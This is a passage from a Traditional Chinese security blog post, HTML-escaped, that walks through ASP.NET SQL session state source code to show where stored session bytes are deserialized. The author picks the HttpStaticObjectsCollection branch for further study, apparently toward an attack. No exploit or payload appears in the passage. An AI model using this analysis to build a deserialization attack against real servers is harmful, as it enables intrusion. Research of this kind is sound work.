                    &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;MemoryStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateUtility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeserializeStoreData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s_configCompressionEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;_rqOrigStreamLen&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Position&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nf&quot;&gt;DisposeOrReuseConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;usePooling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        
        &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SqlStateConnection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IDisposable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SqlCommand&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TempGet&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SqlCommand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dbo.TempGetStateItem3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_sqlConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CommandType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommandType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StoredProcedure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CommandTimeout&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s_commandTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;c1&quot;&gt;// ignore process of setting parameters&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我們可以從程式碼清楚看出主要是呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;ASPState.dbo.TempGetStateItem3&lt;/code&gt; Stored Procedure 取得 Session 的序列化二進制資料並保存到 buf 變數，最後將 buf 傳入 &lt;code class=&quot;highlighter-rouge&quot;&gt;SessionStateUtility.DeserializeStoreData&lt;/code&gt; 進行反序列化還原出 Session 物件，而 TempGetStateItem3 這個 SP 則是相當於在執行 &lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT SessionItemShort FROM [ASPState].dbo.ASPStateTempSessions&lt;/code&gt;，所以可以知道 Session 是儲存在 ASPStateTempSessions 資料表的 SessionItemShort 欄位中。接著讓我們繼續往下看關鍵的 DeserializeStoreData 做了什麼樣的操作。同樣地，行數偏多，有需求的朋友請自行下拉 XD&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Web.SessionState&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SessionStateUtility&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SecurityPermission&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SecurityAction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SerializationFormatter&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Stream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SessionStateItemCollection&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;Byte&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;BinaryReader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;BinaryReader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateItemCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SessionStateItemCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateUtility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetSessionStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invalid_session_state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EndOfStreamException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invalid_session_state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SessionStateStoreData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
        &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DeserializeStoreData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Stream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compressionEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateUtility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我們可以看到實際上 DeserializeStoreData 又是把反序列化過程轉交給其他類別，而依據取出的資料不同，可能會轉交給 &lt;code class=&quot;highlighter-rouge&quot;&gt;SessionStateItemCollection.Deserialize&lt;/code&gt; 或 &lt;code class=&quot;highlighter-rouge&quot;&gt;HttpStaticObjectsCollection.Deserialize&lt;/code&gt; 做處理，在觀察程式碼後發現 &lt;code class=&quot;highlighter-rouge&quot;&gt;HttpStaticObjectsCollection&lt;/code&gt; 的處理相對單純，所以我個人就選擇往這個分支下去研究。&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Web&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sealed&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ICollection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BinaryReader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;typename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;hasInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsEntry&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;hasInstance&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AltSerialization&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadValueFromStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpStaticObjectsEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;c1&quot;&gt;// skipped&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
